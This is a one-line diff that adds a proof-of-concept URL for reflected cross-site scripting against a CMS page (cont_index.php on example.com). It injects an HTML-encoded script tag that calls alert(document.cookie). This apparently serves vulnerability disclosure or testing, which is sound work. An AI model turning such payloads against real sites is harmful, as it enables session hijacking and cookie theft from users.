@@ -1,0 +1,1 @@
+http://www.example.com/cont_index.php?cms_id=PAGE_ID&amp;search=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
